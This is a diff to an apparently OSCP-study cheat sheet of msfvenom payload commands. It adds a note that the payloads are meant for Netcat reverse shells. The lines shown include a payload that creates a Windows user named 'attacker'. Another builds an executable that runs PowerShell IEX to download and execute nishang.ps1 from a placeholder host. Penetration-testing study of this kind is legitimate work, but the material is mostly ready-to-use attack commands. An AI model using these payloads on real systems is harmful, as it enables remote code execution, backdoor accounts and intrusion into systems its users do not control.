@@ -12,6 +12,10 @@ msfvenom -l encoders #Encoders
 msfvenom -l platforms #Platforms
 ```
 
+{% hint style="info" %}
+**Note**: I created this page during my OSCP preparation. All payloads here are for gaining a reverse shell through Netcat, as Metasploit (or Meterpreter) is prohibited.
+{% endhint %}
+
 ### Web Based Payload
 
 ASP Payload
@@ -49,11 +53,13 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 
 Execute Command
 
+{% code overflow="wrap" %}
 ```bash
 msfvenom -a x86 --platform Windows \
 -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" \
 -f exe > pay.exe
 ```
+{% endcode %}
 
 ```bash
 msfvenom -a x86 --platform Windows -p \
